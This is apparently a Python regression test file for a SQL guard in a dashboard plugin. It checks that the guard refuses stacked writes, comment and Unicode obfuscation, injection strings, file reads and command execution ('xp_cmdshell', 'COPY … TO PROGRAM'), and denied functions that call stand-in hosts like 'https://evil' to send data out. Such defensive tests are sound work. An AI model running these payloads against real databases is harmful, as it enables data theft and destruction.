"""Regression tests for the second review of the live-dashboard checks (live.py): the lexer-based SQL guard
(N1, N3), auto-approval only for calls whose filters vary data (N2), scalar hole values (N4), plain-decimal
numbers (N5), the false positives the old regex guard had, and invisible characters in the dialog."""

import importlib
import json
import os
import shutil
import subprocess
import sys
import tempfile
import time
import unittest
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
PLUGIN = ROOT / "plugin"
sys.path.insert(0, str(PLUGIN))
sys.path.insert(0, str(ROOT / "tests"))
os.environ.setdefault("HERMES_ARTIFACTS_DIR", tempfile.mkdtemp(prefix="hermes-artifacts-test-"))

from hermes_artifacts import api, live, store  # noqa: E402

NODE = shutil.which("node")
RLO, ZWSP, BOM = chr(0x202E), chr(0x200B), chr(0xFEFF)


def refuses(test, fn, *a):
    with test.assertRaises(live.LiveError) as e:
        fn(*a)
    test.assertEqual(e.exception.status, "refused", e.exception.message)
    return e.exception.message


def add_cases(cls, prefix, items, make):
    for i, item in enumerate(items):
        def test(self, f=make(item)):
            f(self)
        setattr(cls, f"test_{prefix}_{i:02}", test)


# ----------------------------------------------------------------------------- N1: writes the guard must refuse

N1 = ["DELETE/**/FROM users", "DELETE --x\nFROM users", "DELETE\r\nFROM users", "UPDATE/**/users/**/SET a=1",
      "INSERT/**/INTO users VALUES(1)", "DROP/**/TABLE users", "CREATE/**/TABLE x(a int)",
      "MERGE/**/INTO t USING s ON 1=1 WHEN MATCHED THEN DELETE", "CALL/**/proc()", "EXEC/**/sp_x",
      "COPY/**/users TO PROGRAM 'calc'", "VACUUM/**/FULL", "REPLACE/**/INTO t VALUES(1)",
      "DO/**/$$BEGIN DELETE FROM u; END$$", "TRUNCATE users RESTRICT", "TRUNCATE users -- bye", 'GRANT "admin" TO bob',
      "SELECT '\\'' ; DELETE FROM users ; SELECT '\\''", "SELECT E'\\'' ; DELETE FROM users ; SELECT E'\\''",
      "SELECT setval('users_id_seq', 1)", "SELECT pg_terminate_backend(123)", "SELECT lo_unlink(1)",
      # the rest of the review's list
      "TRUNCATE TABLE users RESTRICT", "ALTER TABLE users DROP COLUMN x", "DELETE\u00a0FROM users",
      "\uff24\uff25\uff2c\uff25\uff34\uff25 FROM users", "SELECT 1 /* ; */ ; DELETE FROM users", "SELECT $$x$$; DELETE FROM users",
      "WITH x AS (DELETE FROM users RETURNING *) SELECT * FROM x", "SELECT * INTO OUTFILE '/tmp/x' FROM users",
      "SELECT pg_read_file('/etc/passwd')", "SELECT query_to_xml('DELETE FROM users', true, true, '')",
      "SELECT dblink_exec('x')", "SELECT * FROM t WHERE a = `x` ; DELETE FROM users", "begin; delete from users; commit",
      "UPDATE users\nSET a=1", "DELETE\x0bFROM users", "DELETE\x0cFROM users",
      "SELECT 1 FROM t WHERE x = 1 UNION ALL SELECT txid_current()",
      # where dialects read the same text differently: one reading sees the second statement
      "SELECT 1 # 1; DELETE FROM users", "SELECT 1 /* /* */ ; DELETE FROM users; /* */", "SELECT 1--1; DELETE FROM users",
      "SELECT a$x$ ; DELETE FROM users ; $x$", "SELECT [a'b] ; DELETE FROM users; SELECT ']'",
      "SELECT '''a'b''' ; DELETE FROM t ; SELECT '''c'd'''", "SELECT q'[a']' ; DELETE FROM t ; SELECT q'[b']'",
      "SELECT 1 -- x\r; DELETE FROM users", "SELECT 1 /*! ; DELETE FROM users */", "SELECT \"setval\"('s', 1)",
      "SELECT pg_catalog.setval('s', 1)", "SELECT 1 DELETE users", "SELECT 1 FROM t FOR UPDATE",
      "SELECT sleep(10)", "SELECT 1; SELECT 2"]

# A free-text value (a whole-argument hole, or text with holes that is not SQL) that is a statement.
VALUES_REFUSED = ["; DELETE FROM users", "EXPLAIN ANALYZE DELETE FROM users", "DELETE u FROM users u",
                  "UPDATE users AS u SET admin=true", "INSERT users VALUES(1)", "REPLACE INTO users VALUES(1)",
                  "TRUNCATE users", "COPY users TO PROGRAM 'calc.exe'", "DO $$ BEGIN DELETE FROM users; END $$",
                  "DROP USER bob", "ALTER USER bob WITH SUPERUSER", "ATTACH DATABASE 'C:/x.db' AS x",
                  "(SELECT 1); DELETE FROM users", "GRANT SELECT, INSERT ON users TO bob", "VACUUM",
                  "SELECT pw FROM users", "DELETE users", "x: DELETE users", "SELECT 1 DELETE users",
                  "EXEC xp_cmdshell whoami", "Revenue by month\nDELETE FROM users", "Bob's\nDELETE x",
                  "IF 1=1 DELETE users", "DELETE users PRINT 1", "SET search_path TO evil", *N1]
# ... and the phrases a search box may hold.
PROSE = ["update on sales", "delete old drafts", "create a report for Q3", "show me revenue", "Azure Functions",
         "update notes for Teams", "select the best Azure SKU", "copy the doc to Teams", "analyze sales trends",
         "explain the chart", "grant me access", "drop by tomorrow", "insert coin", "vacuum cleaner reviews",
         "truncate long names", "Find tickets about North America", "Note: update on sales", "with love",
         "show me the updates", "revenue 2024-01-01"]
# Known false positives of the free-text rule (refused, by design: they read like the statements above).
KNOWN_FP = ["set goals to 5", "update", "delete drafts", "update user settings", "delete Bob's drafts",
            "export sales from Q3", "grant access to Bob", "update on sales, marketing"]


class GuardTests(unittest.TestCase):
    pass


add_cases(GuardTests, "n1_refused", N1, lambda q: lambda self: refuses(self, live.guard, {"sql": q}))
add_cases(GuardTests, "n1_refused_nested", N1[:6], lambda q: lambda self: refuses(self, live.guard, {"o": {"a": [q]}}))
add_cases(GuardTests, "value_refused", VALUES_REFUSED,
          lambda q: lambda self: refuses(self, live.guard, {"q": q}, {"q": "{{q}}"}))
add_cases(GuardTests, "prose_value_passes", PROSE, lambda q: lambda self: live.guard({"q": q}, {"q": "{{q}}"}))
add_cases(GuardTests, "prose_text_passes", PROSE, lambda q: lambda self: live.guard({"query": q}))
add_cases(GuardTests, "known_false_positive", KNOWN_FP,
          lambda q: lambda self: refuses(self, live.guard, {"q": q}, {"q": "{{q}}"}))


class GuardPassesTests(unittest.TestCase):
    def test_read_queries_pass(self):
        for q in ["SELECT region, SUM(n) FROM sales GROUP BY region", "WITH a AS (SELECT 1 AS x) SELECT * FROM a",
                  "SELECT * FROM `proj.ds.table` WHERE d >= '2024-01-01' LIMIT 100", "SELECT 'it''s' AS s FROM t",
                  "SELECT * FROM t WHERE note = 'please update the deleted rows'", "SELECT updated_at, deleted FROM t",
                  "SELECT a FROM t -- comment", "#standardSQL\nSELECT 1", "SELECT 'C:\\' AS p FROM t",
                  "SELECT REPLACE(name, 'a', 'b') FROM t", "SELECT \"a;b\" FROM t", "SELECT 1;",
                  "SELECT x FROM t WHERE REGEXP_CONTAINS(name, r'^a\\d')", "SELECT * FROM t WHERE p > $1",
                  "/* note */ SELECT 1", "SELECT * EXCEPT(a) FROM t", "SELECT 1\r\nFROM t\r\n"]:
            live.guard({"sql": q})

    def test_unclosed_quote_and_too_long(self):
        self.assertIn("unclosed", refuses(self, live.guard, {"sql": "SELECT 'x FROM t"}))
        refuses(self, live.guard, {"sql": "SELECT 1 FROM t WHERE a = 'x' " + "OR a = 'x' " * 1600})

    def test_too_much_work_is_refused(self):
        refuses(self, live.guard, {"sql": "SELECT E'\' r'' `a` # -- /* /* */ $a$ [x] ''' q'[x]' 1\r" + " x" * 1000})


# ----------------------------------------------------------------------------- N3: # comment heads

class HashHeadTests(unittest.TestCase):
    TPL = {"sql": "#standardSQL\nSELECT n FROM sales WHERE region = '{{r}}'"}

    def test_hash_head_is_still_sql(self):
        self.assertEqual(live._hole_sql(self.TPL["sql"]), ["raw"])  # # makes the template not simple
        self.assertEqual(live.sql_kind("#c\nSELECT 1; DELETE FROM t"), "other")
        self.assertEqual(live.sql_kind("#c\nSELECT 1"), "read")

    def test_hostile_value_after_a_hash_head_is_refused(self):
        rules = {"r": {"pattern": "[^\\n]{1,80}"}}
        refuses(self, live.fill, self.TPL, {"r": "x' UNION SELECT password FROM users; DELETE/**/FROM sales; SELECT '"}, rules)
        refuses(self, live.fill, self.TPL, {"r": "North"}, rules)  # a raw hole needs a number rule or an enum of names
        self.assertTrue(live.problems(ds(self.TPL, rules)))
        self.assertIn("'North'", live.fill(self.TPL, {"r": "North"}, {"r": {"enum": ["North"]}})["sql"])


# ----------------------------------------------------------------------------- holes: simple templates only

class HoleTests(unittest.TestCase):
    def test_quoted_holes_in_simple_templates(self):
        for t in ["SELECT d, SUM(n) FROM p.d.t WHERE d >= '{{f}}' GROUP BY d", "SELECT * FROM t WHERE a = 'it''s {{f}}'",
                  "SELECT d FROM t WHERE region = '{{f}}' AND price > 1", "SELECT * FROM t WHERE a = 'x {{f}} y'",
                  "SELECT * FROM t WHERE a = '' AND b = '{{f}}'"]:
            self.assertEqual(live._hole_sql(t), ["quoted"], t)
            live.fill({"q": t}, {"f": "2024-01-01"}, {"f": {"pattern": "\\d{4}-\\d{2}-\\d{2}"}})

    def test_every_hole_is_raw_in_a_template_that_is_not_simple(self):
        for t in ["SELECT d, SUM(n) FROM `p.d.t` WHERE d >= '{{f}}' GROUP BY d",
                  "-- revenue by day\nSELECT d FROM t WHERE d >= '{{f}}'", "#standardSQL\nSELECT d FROM t WHERE d >= '{{f}}'",
                  "SELECT d FROM t WHERE REGEXP_CONTAINS(name, r'^a\\d') AND d >= '{{f}}'",
                  "SELECT d FROM t WHERE region = '{{f}}' AND price > $1", "/* c */ SELECT d FROM t WHERE d = '{{f}}'",
                  "SELECT * FROM t WHERE a = E'{{f}}'", "SELECT * FROM t WHERE a = N'{{f}}'", "SELECT 1 -- {{f}}",
                  "SELECT * FROM t WHERE a = '''{{f}}'''", 'SELECT d FROM t WHERE region = "{{f}}"',
                  "SELECT [a] FROM t WHERE b = '{{f}}'", "SELECT * FROM t WHERE a = '{{f}}"]:
            self.assertEqual(live._hole_sql(t), ["raw"], t)
            refuses(self, live.fill, {"q": t}, {"f": "2024-01-01"}, {"f": {"pattern": "\\d{4}-\\d{2}-\\d{2}"}})
            self.assertTrue(live.problems(ds({"q": t}, {"f": {"pattern": ".*"}})), t)

    def test_raw_holes_take_numbers_or_an_enum_of_names(self):
        tpl = {"q": "SELECT * FROM {{t}} LIMIT {{n}}"}
        rules = {"t": {"enum": ["sales", "dbo.orders", "p.d.t"]}, "n": {"type": "number", "maximum": 100}}
        self.assertEqual(live.problems(ds(tpl, rules)), [])
        self.assertEqual(live.fill(tpl, {"t": "dbo.orders", "n": 5}, rules)["q"], "SELECT * FROM dbo.orders LIMIT 5")
        for enum in (["users WHERE 1=1"], ["a b"], ["a.b.c.d"], ["delete"], ["x.select"], ["1abc"], ["a-b"]):
            r = {"t": {"enum": enum}, "n": {"type": "number"}}
            self.assertTrue(live.problems(ds(tpl, r)), enum)
            refuses(self, live.fill, tpl, {"t": enum[0], "n": 1}, r)
        msg = live.problems(ds(tpl, {"t": {"pattern": "\\w+"}, "n": {"type": "number"}}))[0]
        self.assertIn("inside '…'", msg)
        self.assertIn("enum of names", msg)

    def test_prose_holes(self):
        t = "Find tickets about {{region}} since {{from}}"
        self.assertEqual(live._hole_sql(t), [None, None])
        live.guard(live.fill({"q": t}, {"region": "update on sales", "from": "2024"}, {}), {"q": t})
        refuses(self, live.guard, {"q": "Find tickets about x; DELETE FROM users"}, {"q": t})

    def test_hole_values_are_capped_before_any_reading(self):
        refuses(self, live.fill, {"q": "{{q}}"}, {"q": "a" * 501}, {})
        self.assertEqual(len(live.fill({"q": "{{q}}"}, {"q": "a" * 500}, {})["q"]), 500)
        refuses(self, live.fill, {"q": "SELECT 1 FROM t WHERE a = '{{q}}'"}, {"q": "a" * 501}, {"q": {"pattern": "a*"}})
        for bad in ("a\x00b", "a\x1bb", "a{{b", "a" + chr(0x2028) + "b"):
            refuses(self, live.fill, {"q": "SELECT 1 FROM t WHERE a = '{{q}}'"}, {"q": bad}, {"q": {"pattern": "[\\s\\S]*"}})


# ----------------------------------------------------------------------------- third review: PostgreSQL a$q$ names

PG_TPL = "SELECT 1 AS a$q$ , $q$'$q$ AS a, {{r}} AS b, $q$'$q$ AS c FROM sales"
STACKED_BALANCED = "SELECT 1 AS a$x$ , $q$'$q$ ; DELETE FROM users ; SELECT 1 WHERE '' = '$x$''"


class DesyncTests(unittest.TestCase):
    def setUp(self):
        live._RAN.clear()

    def test_h1_an_enum_hole_after_a_dollar_name_never_auto_approves_nor_runs_code(self):
        evil = "password FROM users UNION SELECT 1, NULL"
        rules = {"r": {"enum": ["eu", evil]}}
        self.assertEqual(live._hole_sql(PG_TPL), ["raw"])
        live.record_call("s", "mcp_db_query", {"sql": PG_TPL.replace("{{r}}", "eu")}, "ok")
        self.assertFalse(live.recorded_match("s", ds({"sql": PG_TPL}, rules)))
        self.assertTrue(live.problems(ds({"sql": PG_TPL}, rules)))
        refuses(self, live.fill, {"sql": PG_TPL}, {"r": evil}, rules)
        aid = store.publish(title="h1", type="dashboard", files={"dashboard.json": {"datasets": {"s": {"source": {
            "kind": "call", "tool": "mcp_db_query", "args": {"sql": PG_TPL}, "rules": rules}}}}, "index.html": "x"})["id"]
        got = live.approve_published(aid, "s")
        self.assertEqual((got["approved"], list(got["refused"])), (0, ["s"]))

    def test_h2_a_pattern_hole_there_is_refused_at_publish_and_run(self):
        rules = {"r": {"pattern": "[^\\n]{1,200}"}}
        self.assertTrue(live.problems(ds({"sql": PG_TPL}, rules)))
        refuses(self, live.fill, {"sql": PG_TPL}, {"r": "1; DELETE FROM users; SELECT 1"}, rules)
        aid = store.publish(title="h2", type="dashboard", files={"dashboard.json": {"datasets": {"s": {"source": {
            "kind": "call", "tool": "mcp_db_query", "args": {"sql": PG_TPL}, "rules": rules}}}}, "index.html": "x"})["id"]
        store.set_approval(aid, live._cid(live.dataset(aid, "s")), "mcp_db_query", True)  # as if the user had allowed it
        ran = []
        saved = live.run_tool
        live.run_tool = lambda t, a: ran.append(a) or {"rows": []}
        try:
            self.assertEqual(live.run_dataset(aid, "s", {"r": "1; DELETE FROM users; SELECT 1"})["status"], "refused")
        finally:
            live.run_tool = saved
        self.assertEqual(ran, [])
        with self.assertRaises(api.ApiError):  # and the dialog never offers it
            api.handle("POST", f"artifacts/{aid}/approval", {}, {"id": "s"})

    def test_the_stacked_write_is_refused_on_its_merits(self):
        self.assertIn("single statement", live._sql_violation(STACKED_BALANCED))
        self.assertIn("single statement", live._sql_violation(STACKED_BALANCED[:-1]))
        self.assertTrue(any(m[4] == "pg" for m in live._readings(STACKED_BALANCED)))
        # without the PostgreSQL reading every other reading closes its quotes and hides the DELETE
        others = [m for m in live._readings(STACKED_BALANCED) if m[4] != "pg"]
        self.assertTrue(any(not live._lex(STACKED_BALANCED, m)[1] for m in others))
        for m in others:
            toks, _ = live._lex(STACKED_BALANCED, m)
            self.assertNotIn("DELETE", [t[1] for t in toks if t[0] == "w"])


class WorkBudgetTests(unittest.TestCase):
    TAIL = " # $ [ /* */ /* */ ''' \r \\ e'x' "

    def test_review_dos_strings_are_refused_at_once(self):
        for unit, k in (("--x\n", 3990), ("ab ", 5300), ("(", 15950), ("#x\n", 5300), ("/*a*/", 3190)):
            v = (unit * k + self.TAIL)[:15990]
            for tpl in ({"q": "{{q}}"}, None):
                live._views.cache_clear()
                t = time.perf_counter()
                refuses(self, live.guard, {"q": v}, tpl)
                self.assertLess(time.perf_counter() - t, 0.5, unit)

    def test_the_worst_string_under_the_budget_stays_fast(self):
        for unit in ("#x\n", "--x\n", "("):
            n = len(live._readings(self.TAIL + unit * 3))
            size = live._WORK_MAX // n
            v = (unit * size)[:size - len(self.TAIL)] + self.TAIL
            live._views.cache_clear()
            t = time.perf_counter()
            try:
                live.guard({"q": v})
            except live.LiveError:
                pass
            self.assertLess(time.perf_counter() - t, 1.5, unit)  # about 0.45 s on the development machine

    def test_many_strings_share_one_budget(self):
        refuses(self, live.guard, {f"k{i}": "#x\n" * 200 + self.TAIL for i in range(40)})


REALISTIC = [
    "SELECT d, SUM(revenue) OVER (PARTITION BY region ORDER BY d ROWS BETWEEN 6 PRECEDING AND CURRENT ROW) AS r7 FROM `proj.ds.sales` WHERE d >= DATE_SUB(CURRENT_DATE(), INTERVAL 30 DAY)",
    "WITH base AS (SELECT user_id, MIN(created_at) AS first FROM events GROUP BY 1) SELECT DATE_TRUNC(first, MONTH) AS m, COUNT(*) FROM base GROUP BY m ORDER BY m",
    "SELECT id, payload->>'status' AS status, (payload->'items')::jsonb AS items, created_at::date AS d FROM orders WHERE tags @> ARRAY['vip'] LIMIT 100",
    "SELECT REPLACE(name, '-', ' ') AS clean, LEFT(sku, 3) AS fam, EXTRACT(YEAR FROM created_at) AS y FROM products",
    "SELECT CASE WHEN amount > 100 THEN 'big' ELSE 'small' END AS size, COUNT(*) AS n FROM payments GROUP BY 1",
    "SELECT update_time, comment, into_x, `set` FROM t", "SELECT a AS `set`, b AS \"comment\" FROM t",
    "SELECT * FROM t WHERE note LIKE '%delete; drop%' UNION ALL SELECT * FROM u",
    "SELECT COUNT(*) FILTER (WHERE status = 'ok') FROM jobs", "SELECT region, SUM(n) AS total FROM sales GROUP BY ROLLUP(region)",
    "SELECT TRY_CAST(v AS INT) AS n, IFF(x > 0, 'pos', 'neg') AS s, v:path::string AS p FROM snow_t QUALIFY ROW_NUMBER() OVER (PARTITION BY id ORDER BY ts DESC) = 1",
    "SELECT date_format(ts, 'yyyy-MM') AS m, count(*) FROM main.default.events GROUP BY 1",
    "SELECT JSON_EXTRACT(doc, '$.a') AS a, GROUP_CONCAT(name SEPARATOR ', ') FROM t GROUP BY a",
    "SELECT TOP 10 [Name], [Order Date] FROM dbo.Orders ORDER BY [Order Date] DESC",
    "SELECT * FROM t WHERE created_at > NOW() - INTERVAL '7 days' ORDER BY created_at DESC",
    "SELECT u.name, o.total FROM users u LEFT JOIN orders o ON o.user_id = u.id WHERE o.total IS NOT NULL",
    "SELECT a FROM t; ", "SELECT 'a;b', \"x;y\" FROM t", "SELECT SPLIT(tags, ',') AS parts, ARRAY_LENGTH(SPLIT(tags, ',')) AS n FROM t",
    "SELECT format('%s rows', count(*)) FROM t", "SELECT * FROM t WHERE email = 'a@b.com' -- recent only\nAND d > '2024-01-01'",
    "SELECT d, set_name, merge_count, copy_of, call_count, grant_amount, execute_ms FROM t",
    "SELECT * FROM UNNEST(GENERATE_DATE_ARRAY('2024-01-01', '2024-02-01')) AS d", "SELECT version()",
    "SELECT pg_size_pretty(pg_total_relation_size('t'))"]
DENIED = ["SELECT SYSTEM$SEND_EMAIL('int', 'x@evil.com', 's', (SELECT LISTAGG(pw) FROM users))",
          "SELECT cron.schedule('j', '* * * * *', 'DELETE FROM users')",
          "SELECT aws_s3.query_export_to_s3('SELECT * FROM users', aws_commons.create_s3_uri('b','k','r'))",
          "SELECT aws_lambda.invoke('fn', '{}')", "SELECT http_request('https://evil', 'POST')",
          "SELECT net.http_post('https://evil', '{}')", "SELECT pg_try_advisory_lock(1)",
          "SELECT pg_logical_slot_get_changes('s', NULL, NULL)", "SELECT pg_replication_origin_create('x')",
          "SELECT ai_query('endpoint', (SELECT pw FROM users))", "SELECT java_method('java.lang.System', 'setProperty', 'a', 'b')",
          "SELECT reflect('java.lang.Runtime', 'getRuntime')", "SELECT writefile('/tmp/x', 'y')", "SELECT readfile('/etc/passwd')",
          "SELECT * FROM t FOR UPDATE", "SELECT gen_random_uuid() INTO TEMP x", "SELECT EXTERNAL_QUERY('conn', 'DELETE FROM t')",
          "SELECT \"cron\".\"schedule\"('j', '* * * * *', 'x')", "SELECT load_extension('x')"]


class RealisticTests(unittest.TestCase):
    pass


add_cases(RealisticTests, "stored_query_passes", REALISTIC, lambda q: lambda self: self.assertEqual(
    live.problems(ds({"sql": q}, {})), [], q))
add_cases(RealisticTests, "denied_function", DENIED, lambda q: lambda self: refuses(self, live.guard, {"sql": q}))


class RealisticTemplateTests(unittest.TestCase):
    def setUp(self):
        live._RAN.clear()

    def test_quoted_enum_auto_approves(self):
        d = ds({"sql": "SELECT n FROM sales WHERE region = '{{r}}'"}, {"r": {"enum": ["eu", "us"]}})
        live.record_call("s", "mcp_db_query", {"sql": "SELECT n FROM sales WHERE region = 'eu'"}, "ok")
        self.assertEqual(live.problems(d), [])
        self.assertTrue(live.recorded_match("s", d))

    def test_quoted_date_pattern_runs_after_the_dialog(self):
        d = ds({"sql": "SELECT d, n FROM sales WHERE d >= '{{from}}'"}, {"from": {"pattern": "\\d{4}-\\d{2}-\\d{2}"}})
        live.record_call("s", "mcp_db_query", {"sql": "SELECT d, n FROM sales WHERE d >= '2024-01-01'"}, "ok")
        self.assertEqual(live.problems(d), [])
        self.assertFalse(live.recorded_match("s", d))  # a pattern never approves without asking
        self.assertIn("'2024-02-01'", live.fill(d["args"], {"from": "2024-02-01"}, d["rules"])["sql"])

    def test_limit_number_auto_approves(self):
        d = ds({"sql": "SELECT n FROM sales LIMIT {{n}}"}, {"n": {"type": "number", "minimum": 1, "maximum": 500}})
        live.record_call("s", "mcp_db_query", {"sql": "SELECT n FROM sales LIMIT 100"}, "ok")
        self.assertTrue(live.recorded_match("s", d))

    def test_table_enum_waits_for_the_dialog(self):
        d = ds({"sql": "SELECT * FROM {{t}} LIMIT 10"}, {"t": {"enum": ["sales", "orders"]}})
        live.record_call("s", "mcp_db_query", {"sql": "SELECT * FROM sales LIMIT 10"}, "ok")
        self.assertEqual(live.problems(d), [])
        self.assertFalse(live.recorded_match("s", d))

    def test_bigquery_backticks_make_a_quoted_hole_raw(self):
        sql = "SELECT d, SUM(n) FROM `proj.ds.sales` WHERE region = '{{r}}' GROUP BY d"
        msg = live.problems(ds({"sql": sql}, {"r": {"pattern": "[A-Za-z ]+"}}))
        self.assertEqual(len(msg), 1)
        self.assertIn("put it inside '…' in a query with none of", msg[0])
        self.assertEqual(live.problems(ds({"sql": sql}, {"r": {"enum": ["eu", "us"]}})), [])  # names: fine
        self.assertTrue(live.problems(ds({"sql": sql}, {"r": {"enum": ["North America"]}})))  # not a name


# ----------------------------------------------------------------------------- N2: auto-approval

def ds(args, rules, poll=None):
    return {"tool": "mcp_db_query", "args": args, "rules": rules, "poll": poll}


class AutoApprovalTests(unittest.TestCase):
    EVIL = "x' UNION SELECT password FROM users WHERE 'a'='a"

    def setUp(self):
        live._RAN.clear()

    def ran(self, args):
        live.record_call("s", "mcp_db_query", args, "ok")

    def test_an_enum_value_that_is_not_a_safe_token_never_approves_nor_runs(self):
        self.ran({"sql": "SELECT n FROM sales WHERE region = 'eu'"})
        d = ds({"sql": "SELECT n FROM sales WHERE region = '{{r}}'"}, {"r": {"enum": ["eu", self.EVIL]}})
        self.assertFalse(live.recorded_match("s", d))
        refuses(self, live.fill, d["args"], {"r": self.EVIL}, d["rules"])
        refuses(self, live.fill, d["args"], {"r": "eu"}, d["rules"])  # the enum itself is refused at run time
        self.assertTrue(live.problems(d))
        for bad in ["a'b", "a\\b", "a\nb", "a{{b}}", "a--b", "a" * 101, "a" + ZWSP, float("nan")]:
            self.assertFalse(live._enum_safe({"enum": [bad]}), bad)
        for ok in ["eu", "North America", "Q1-2024", "a.b:c/d@e+f,g", "Kelet-Magyarorsz\u00e1g", 3, 2.5, True, ""]:
            self.assertTrue(live._enum_safe({"enum": [ok]}), ok)

    def test_a_name_place_hole_never_auto_approves(self):
        self.ran({"sql": "SELECT * FROM sales WHERE id = 7"})
        d = ds({"sql": "SELECT * FROM {{t}} WHERE id = {{id}}"}, {"t": {"enum": ["sales", "secrets"]}, "id": {"type": "number"}})
        self.assertFalse(live.recorded_match("s", d))
        d = ds({"sql": "SELECT * FROM sales WHERE id = {{id}}"}, {"id": {"type": "number"}})
        self.assertTrue(live.recorded_match("s", d))  # a number in SQL text is data

    def test_quoted_enum_and_whole_value_holes_approve(self):
        self.ran({"sql": "SELECT n FROM sales WHERE region = 'eu'", "limit": 5})
        d = ds({"sql": "SELECT n FROM sales WHERE region = '{{r}}'", "limit": "{{n}}"},
               {"r": {"enum": ["eu", "us"]}, "n": {"type": "number", "maximum": 9}})
        self.assertTrue(live.recorded_match("s", d))

    def test_free_and_prose_holes_never_auto_approve(self):
        self.ran({"q": "update on sales"})
        self.assertFalse(live.recorded_match("s", ds({"q": "{{q}}"}, {})))
        self.assertFalse(live.recorded_match("s", ds({"q": "{{q}}"}, {"q": {"pattern": ".*"}})))
        self.ran({"q": "tickets about eu"})
        self.assertFalse(live.recorded_match("s", ds({"q": "tickets about {{r}}"}, {"r": {"enum": ["eu"]}})))

    def test_a_raw_string_enum_in_sql_waits(self):
        self.ran({"sql": "SELECT n FROM sales WHERE region = eu"})
        self.assertFalse(live.recorded_match("s", ds({"sql": "SELECT n FROM sales WHERE region = {{r}}"}, {"r": {"enum": ["eu"]}})))


# ----------------------------------------------------------------------------- N4, N5

class ValueTests(unittest.TestCase):
    def test_hole_values_are_scalars(self):
        for v in ({"a": 1}, [[1]], ["a"], float("inf")):
            with self.assertRaises(live.LiveError):
                live.fill({"x": "{{v}}"}, {"v": v}, {})
        self.assertEqual(live.fill({"x": "{{v}}"}, {"v": ["a"]}, {"v": {"enum": ["a", "b"]}})["x"], ["a"])
        for v in ("a", 2, 2.5, True):
            self.assertEqual(live.fill({"x": "{{v}}"}, {"v": v}, {})["x"], v)

    def test_numbers_are_plain_decimals(self):
        tpl, rule = {"sql": "SELECT n FROM t LIMIT {{n}}"}, {"n": {"type": "number", "minimum": -5, "maximum": 1e30}}
        for text in ("NaN", "Infinity", "-Infinity", "1e2", "0x10", "1_000", " 5", "5."):
            self.assertFalse(live.args_match(tpl, {"sql": f"SELECT n FROM t LIMIT {text}"}, rule), text)
        self.assertTrue(live.args_match(tpl, {"sql": "SELECT n FROM t LIMIT 5.5"}, rule))
        self.assertFalse(live.args_match(tpl, {"sql": "SELECT n FROM t LIMIT -9"}, rule))  # min/max hold
        self.assertEqual(live.fill(tpl, {"n": 1e20}, rule)["sql"], "SELECT n FROM t LIMIT 100000000000000000000")
        self.assertEqual(live.fill(tpl, {"n": 2.5}, rule)["sql"], "SELECT n FROM t LIMIT 2.5")
        with self.assertRaises(live.LiveError):
            live.fill(tpl, {"n": float("nan")}, rule)
        with self.assertRaises(live.LiveError):
            live.fill(tpl, {"n": 1e300}, {"n": {"type": "number"}})


# ----------------------------------------------------------------------------- publish, dialog

def spec(sql, rules=None):
    return {"datasets": {"m": {"source": {"kind": "call", "tool": "mcp__db__query", "args": {"sql": sql},
                                          "rules": rules or {}}}}}


class PublishAndDialogTests(unittest.TestCase):
    def test_a_write_template_is_refused_at_publish(self):
        from test_live_consent import Cfg
        from test_types import load_plugin
        p = load_plugin()
        p._ctx = Cfg()
        for sql, rules in (("DELETE FROM users", {}), ("SELECT 1; DROP TABLE t", {}),
                           ("SELECT 1 -- {{x}}", {"x": {"pattern": "a"}}), ("SELECT * FROM {{x}}", {"x": {"enum": ["a b"]}})):
            out = json.loads(p._publish({"type": "dashboard", "title": "t", "open": False,
                                         "files": {"dashboard.json": spec(sql, rules), "index.html": "x"}}))
            self.assertFalse(out["ok"], sql)
            self.assertEqual(out["code"], "live_refused")
            self.assertIn("dataset 'm'", out["error"])
        out = json.loads(p._publish({"type": "dashboard", "title": "t", "open": False,
                                     "files": {"dashboard.json": spec("SELECT 1"), "index.html": "x"}}))
        self.assertTrue(out["ok"], out)

    def test_path_and_base_publishes_are_refused_the_same_way(self):
        from test_live_consent import Cfg
        from test_types import load_plugin
        p = load_plugin()
        p._ctx = Cfg()
        work = Path(tempfile.mkdtemp(prefix="dash-"))
        self.addCleanup(shutil.rmtree, work, True)
        (work / "dashboard.json").write_text(json.dumps(spec("TRUNCATE users")), encoding="utf-8")
        (work / "index.html").write_text("x", encoding="utf-8")
        before = len(store.list_all())
        out = json.loads(p._publish({"type": "dashboard", "title": "t", "open": False, "path": str(work)}, trusted=True))
        self.assertEqual((out["ok"], out["code"]), (False, "live_refused"))
        self.assertEqual(len(store.list_all()), before)
        aid = store.publish(title="b", type="dashboard", files={"dashboard.json": spec("SELECT 1 FROM t WHERE a = '{{q}}' -- x",
                                                                                   {"q": {"pattern": "a"}}), "index.html": "x"})["id"]
        out = json.loads(p._publish({"id": aid, "base": True, "open": False, "files": {"index.html": "y"}}))
        self.assertEqual((out["ok"], out["code"]), (False, "live_refused"))

    def test_a_stored_write_is_refused_not_approved(self):
        aid = store.publish(title="w", type="dashboard", files={"dashboard.json": spec("TRUNCATE users"), "index.html": "x"})["id"]
        live.record_call("s", "mcp__db__query", {"sql": "TRUNCATE users"}, "ok")
        got = live.approve_published(aid, "s")
        self.assertEqual(got["approved"], 0)
        self.assertIn("m", got["refused"])

    def test_the_dialog_marks_free_text_holes_and_refuses_invisible_characters(self):
        s = spec("SELECT 1 FROM t WHERE a = '{{q}}' AND b = '{{r}}'", {"r": {"enum": ["x"]}})
        s["datasets"]["m"]["source"]["args"]["search"] = "{{w}}"
        aid = store.publish(title="d", type="dashboard", files={"dashboard.json": s, "index.html": "x"})["id"]
        p = api.handle("POST", f"artifacts/{aid}/approval", {}, {"id": "m"})
        self.assertEqual(p["free"], ["q", "w"])
        bad = store.publish(title="w", type="dashboard", files={"dashboard.json": spec("DELETE FROM t"), "index.html": "x"})["id"]
        with self.assertRaises(api.ApiError):  # never offered: it would be refused when it runs
            api.handle("POST", f"artifacts/{bad}/approval", {}, {"id": "m"})
        for ch in (RLO, ZWSP, BOM):
            bad = spec("SELECT 1 FROM t WHERE a = 'x" + ch + "'")
            aid = store.publish(title="b", type="dashboard", files={"dashboard.json": bad, "index.html": "x"})["id"]
            with self.assertRaises(api.ApiError):
                api.handle("POST", f"artifacts/{aid}/approval", {}, {"id": "m"})
            with self.assertRaises(api.ApiError):
                api.handle("POST", f"artifacts/{aid}/approval", {}, {"id": "m", "call": "x", "allowed": True})
            self.assertFalse(api.handle("POST", f"artifacts/{aid}/op", {}, {"op": "dataset.decline", "args": {"id": "m"}})["allowed"])
            refuses(self, live.guard, {"q": "a" + ch})
